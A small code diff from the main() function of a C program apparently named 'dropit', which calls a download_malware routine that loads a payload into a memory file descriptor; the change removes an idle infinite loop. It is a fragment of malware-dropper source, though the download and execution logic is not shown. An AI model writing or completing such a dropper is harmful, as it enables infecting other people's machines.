@@ -17,8 +17,6 @@ int     main(int ac, char **av)
         quit_dropit(config, EXIT_FAILURE);
     if ((memfd = download_malware(config)) == -1)
         quit_dropit(config, EXIT_FAILURE);
-    while (1)
-        ;
     quit_dropit(config, EXIT_SUCCESS);
     return (EXIT_SUCCESS);
 }
